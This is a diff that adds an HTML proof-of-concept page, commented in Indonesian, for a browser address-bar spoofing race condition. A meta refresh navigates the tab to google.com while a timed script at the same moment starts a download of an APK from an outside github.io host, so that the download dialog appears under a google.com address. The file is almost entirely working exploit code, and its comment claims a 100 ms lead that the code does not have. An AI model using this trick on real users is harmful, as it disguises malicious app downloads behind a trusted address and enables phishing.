@@ -1,0 +1,21 @@
+<html>
+<head>
+    <title>PoC Meta Race Condition</title>
+    <!-- Refresh pertama: arahkan tab ini ke Google (target spoof) -->
+    <meta http-equiv="refresh" content="5; url=https://google.com">
+</head>
+<body>
+    <h1>Testing Meta Race Condition</h1>
+    <p>Dalam 5 detik, halaman ini akan navigasi ke Google.</p>
+    
+    <script>
+        // Trigger download tepat saat navigasi ke Google dimulai
+        setTimeout(function(){
+            console.log("Triggering download payload...");
+            window.location.href = 'https://bangbedul19-del.github.io/pocbedul.apk';
+        }, 5000); // 100ms sebelum meta-refresh eksekusi
+    </script>
+
+    <p>Jika berhasil, Address Bar akan menunjukkan google.com sementara dialog download muncul.</p>
+</body>
+</html>
